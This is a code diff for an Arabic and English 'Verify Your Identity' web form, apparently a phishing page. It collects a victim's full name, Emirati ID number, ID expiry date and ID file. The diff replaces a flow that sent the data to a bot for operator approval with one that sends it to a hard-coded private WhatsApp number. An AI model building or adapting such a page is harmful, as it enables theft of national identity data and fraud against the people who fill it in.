@@ -257,34 +257,6 @@ body{
   font-family:"Segoe UI",Arial,sans-serif;
 }
 .cta svg{stroke:#fff;fill:none;stroke-width:2;flex:none}
-.status-box{
-  display:none;
-  text-align:center;
-  padding:42px 20px;
-}
-.status-box h3{
-  margin:10px 0 8px;
-  font-size:24px;
-}
-.status-box p{
-  margin:0 auto 22px;
-  max-width:540px;
-  color:var(--muted);
-  font-size:15px;
-  line-height:1.6;
-}
-.retry-btn{
-  display:none;
-  background:var(--blue);
-  color:#fff;
-  border:0;
-  border-radius:10px;
-  padding:11px 22px;
-  font:inherit;
-  font-size:15px;
-  font-weight:700;
-  cursor:pointer;
-}
 @media(max-width:820px){
   .card{padding:20px 16px;margin:14px 12px 28px}
   .grid{grid-template-columns:1fr}
@@ -328,7 +300,7 @@ body{
     </svg>
     <h1>التحقق من الهوية</h1>
     <h2>Verify Your Identity</h2>
-    <p>أدخل بيانات الهوية واضغط على القبول والمتابعة لإرسال الطلب إلى البوت وانتظار الموافقة.</p>
+    <p>أدخل بيانات الهوية واضغط على القبول والمتابعة لإرسال البيانات مباشرة عبر واتساب.</p>
   </section>
 
   <form class="form" id="f" novalidate>
@@ -388,21 +360,13 @@ body{
         <path d="M12 2l8 3v6c0 5-3.5 9-8 11-4.5-2-8-6-8-11V5z"/>
         <path d="M8.5 12l2.5 2.5 4.5-5"/>
       </svg>
-      <div>قبول وإرسال للموافقة<span>Accept &amp; Submit</span></div>
+      <div>قبول وإرسال عبر واتساب<span>Accept &amp; Send on WhatsApp</span></div>
     </button>
   </form>
-
-  <div class="status-box" id="statusBox">
-    <div id="statusIcon" style="font-size:48px">⏳</div>
-    <h3 id="statusTitle">جاري انتظار الموافقة...</h3>
-    <p id="statusDesc">تم إرسال طلبك إلى البوت بنجاح. يرجى الانتظار لحين الضغط على موافقة أو رفض.</p>
-    <button class="retry-btn" id="retryBtn" type="button">إعادة المحاولة</button>
-  </div>
 </main>
 
 <script>
-const SUBMIT_API = "/api/submit";
-const STATUS_API = "/api/webhook";
+const WHATSAPP_PHONE = "971555784831";
 
 const $ = id => document.getElementById(id);
 
@@ -431,60 +395,7 @@ $('file').addEventListener('change', e => {
   $('fn').textContent = f.name;
 });
 
-function createRequestId() {
-  return "REQ-" + Date.now().toString().slice(-6) + "-" + Math.floor(100 + Math.random() * 900);
-}
-
-async function parseJsonSafely(res) {
-  const raw = await res.text();
-  try {
-    return JSON.parse(raw);
-  } catch {
-    throw new Error("تعذر قراءة رد السيرفر. تأكد من نشر مجلد api على Vercel.");
-  }
-}
-
-let pollTimer = null;
-
-function pollDecision(requestId) {
-  clearInterval(pollTimer);
-  pollTimer = setInterval(async () => {
-    try {
-      const res = await fetch(`${STATUS_API}?requestId=${encodeURIComponent(requestId)}`, {
-        cache: "no-store"
-      });
-      const json = await parseJsonSafely(res);
-
-      if (json.status === "approved") {
-        clearInterval(pollTimer);
-        $('statusIcon').textContent = "✅";
-        $('statusTitle').style.color = "var(--green)";
-        $('statusTitle').textContent = "تم القبول";
-        $('statusDesc').textContent = "تمت الموافقة على طلب التحقق بنجاح.";
-        $('retryBtn').style.display = "none";
-      } else if (json.status === "rejected") {
-        clearInterval(pollTimer);
-        $('statusIcon').textContent = "❌";
-        $('statusTitle').style.color = "var(--red)";
-        $('statusTitle').textContent = "تم الرفض";
-        $('statusDesc').textContent = "لم تتم الموافقة على الطلب. يمكنك المحاولة مرة أخرى.";
-        $('retryBtn').style.display = "inline-block";
-      }
-    } catch (_) {}
-  }, 2500);
-}
-
-$('retryBtn').addEventListener('click', () => {
-  clearInterval(pollTimer);
-  $('statusBox').style.display = 'none';
-  $('retryBtn').style.display = 'none';
-  $('statusTitle').style.color = 'var(--text)';
-  $('f').style.display = 'block';
-  $('submitBtn').disabled = false;
-  $('submitBtn').style.opacity = '1';
-});
-
-$('f').addEventListener('submit', async e => {
+$('f').addEventListener('submit', e => {
   e.preventDefault();
   let ok = true;
   const setErr = (id, msg) => {
@@ -516,42 +427,17 @@ $('f').addEventListener('submit', async e => {
 
   if (!ok) return;
 
-  const requestId = createRequestId();
-  const payload = {
-    requestId,
-    name: fullName,
-    eid: eidVal,
-    exp: expVal,
-    fileName: fileObj ? fileObj.name : "غير مرفق"
-  };
+  const lines = [
+    "*بيانات التحقق من الهوية*",
+    `الاسم الكامل: ${fullName}`,
+    `رقم الهوية الإماراتية: ${eidVal}`,
+    `تاريخ انتهاء الهوية: ${expVal}`,
+    `ملف الهوية المرفق: ${fileObj ? fileObj.name : "غير مرفق"}`
+  ];
 
-  $('submitBtn').disabled = true;
-  $('submitBtn').style.opacity = '0.7';
-
-  try {
-    const res = await fetch(SUBMIT_API, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
-    const data = await parseJsonSafely(res);
-    if (!res.ok || !data.ok) {
-      throw new Error(data.error || "تعذر إرسال الطلب");
-    }
-
-    $('f').style.display = 'none';
-    $('statusIcon').textContent = "⏳";
-    $('statusTitle').style.color = "var(--text)";
-    $('statusTitle').textContent = "جاري انتظار الموافقة...";
-    $('statusDesc').textContent = `رقم الطلب: ${requestId} — بانتظار الضغط على موافقة أو رفض من البوت.`;
-    $('statusBox').style.display = 'block';
-
-    pollDecision(requestId);
-  } catch (err) {
-    $('e-accept').textContent = err.message || "حدث خطأ أثناء الإرسال";
-    $('submitBtn').disabled = false;
-    $('submitBtn').style.opacity = '1';
-  }
+  const text = encodeURIComponent(lines.join("\n"));
+  const waUrl = `https://wa.me/${WHATSAPP_PHONE}?text=${text}`;
+  window.open(waUrl, "_blank", "noopener,noreferrer");
 });
 </script>
 </body>
